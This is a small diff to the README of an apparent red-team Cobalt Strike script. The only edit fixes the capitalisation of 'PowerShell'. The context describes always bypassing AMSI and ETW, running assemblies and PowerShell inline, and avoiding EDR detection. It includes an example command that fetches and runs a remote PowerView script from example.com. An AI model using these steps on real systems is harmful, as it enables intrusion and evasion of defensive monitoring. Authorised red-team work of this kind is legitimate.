@@ -43,7 +43,7 @@ For my Red Team Ops I and II cheat sheets, check out my [cheat sheets repo](http
 2. Change `$etw` and `$amsi` as you see fit - I wanted it to always bypass AMSI and ETW, which is why I set these values to 1, though someone could argue this creates additional telemetry in cases where the AMSI/ETW bypass isn't necessary, and for this reason it's better to leave the default values at 0.
 3. [Load script](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_cs-scripting.htm) into Cobalt Strike
 4. Execute .NET assembly inline with `x execute-assembly <exe> <args>`
-5. Execute unmanaged powershell inline with `x powerpick <powershell>`
+5. Execute unmanaged PowerShell inline with `x powerpick <powershell>`
    - I made this compatible with `powershell-import`, but I noticed that using this method of importing scripts generally gets detected by EDR. If you'd like to remove this functionality altogether, comment/remove lines 257 and 258.
    - As an alternative, use `--import <script>` (eg. `x --import https://example.com/PowerView.ps1 powerpick Get-Domain`). You can specify a local file on disk or remotely hosted file with http/https. This only supports importing *one* PowerShell script. I'm too lazy to extend the functionality to support multiple scripts when one per command is usually all you need.
 
